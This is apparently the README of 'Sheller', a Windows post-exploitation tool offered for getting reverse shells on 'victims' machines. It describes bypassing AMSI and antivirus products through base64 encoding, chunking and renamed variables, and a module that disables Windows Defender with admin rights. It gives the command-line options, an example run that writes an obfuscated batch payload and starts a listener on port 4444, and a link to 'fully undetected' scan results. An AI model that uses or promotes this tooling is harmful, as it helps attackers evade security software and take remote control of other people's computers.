# Sheller

Sheller is a Windows Post Exploitation Tool to bypass all known Anti-Malware Scanner Interfaces including Defender, Bitdefender, Kaspersky, McAfee, NANO-Antivirus, Kingsoft, Avast, Avira and many more.



For use python3 and powershell (Windows) or pwsh (Linux) are required, the script supports Windows and Linux distribution.
The module sheller is to gain reverse shell to the victims device, providing several amsi bypass module such as encoding, chunking and var randomization.
There is a module to disable any windows defender antivirus feature if executed with admin privileges too.
# Getting started
```
root@lukeproducts:~/Sheller# python3 sheller.py

Copyright LukeProducts 2022, all rights reserved
 ┌──────────────────────────────────────┐       
 │                   ▼         ##       │       
 │ ┌─────────────────┘    ┌────##───┐   │       
 │ │AMSI Bypass Tool      │    ##   │   │       
 │ └──────────────────────┘    ##   └─► │       
 │                             ##       │       
 │ © Copyright by LukeProducts ##       │       
 └──────────────────────────────────────┘       


usage: sheller2.0.py [-h] [-s SHELLOUTNAME] [-avkill ANTIVIRUSKILL] [-lh LOCALHOST] [-lp LOCALPORT] [-b64] [-ch] [-v]

optional arguments:
  -h, --help            show this help message and exit
  -s SHELLOUTNAME, --shelloutname SHELLOUTNAME
                        Reverse Shell. Value: fileoutputname. Requires: [-lh] [-lp], optional: [-b64] [-ch] [-v]
  -avkill ANTIVIRUSKILL, --antiviruskill ANTIVIRUSKILL
                        script to deactivate AV of victim if executed with admin privileges. Optional flag: [-b64] [-ch]
  -lh LOCALHOST, --localhost LOCALHOST
                        host for payload ("lh" for automatically assign host to this systems address)
  -lp LOCALPORT, --localport LOCALPORT
                        port for payload (4 digit number recommended)
  -b64                  encodes payload to base64
  -ch                   chunks up base64 encoded string (chunking probability in CHUNK_PROBABILITY)
  -v, --varencode       changes all variables names to an random 10 hex digit encoded into VAR_ENCODING encoding type (default is md5)
  ```


# Example
```
root@lukeproducts:~/Sheller# python3 sheller.py -s xy.bat -lh lh -lp 4444 -b64 -ch -v

Copyright LukeProducts 2022, all rights reserved
 ┌──────────────────────────────────────┐       
 │                   ▼         ##       │       
 │ ┌─────────────────┘    ┌────##───┐   │       
 │ │AMSI Bypass Tool      │    ##   │   │       
 │ └──────────────────────┘    ##   └─► │       
 │                             ##       │       
 │ © Copyright by LukeProducts ##       │       
 └──────────────────────────────────────┘       


Host set to "LukeProuctsKali" (192.168.0.129)

[*] Successfully exported payload to "xy.bat" with encoding base64 and chunked up 87 times!
listening on [any] 4444 ...
```

<a href="https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1">fully undetected AMSI Scan Results</a>

[![](https://user-images.githubusercontent.com/73026669/150165109-71b9f841-3b8e-42bd-a502-5d666244eaaf.png)](https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1)

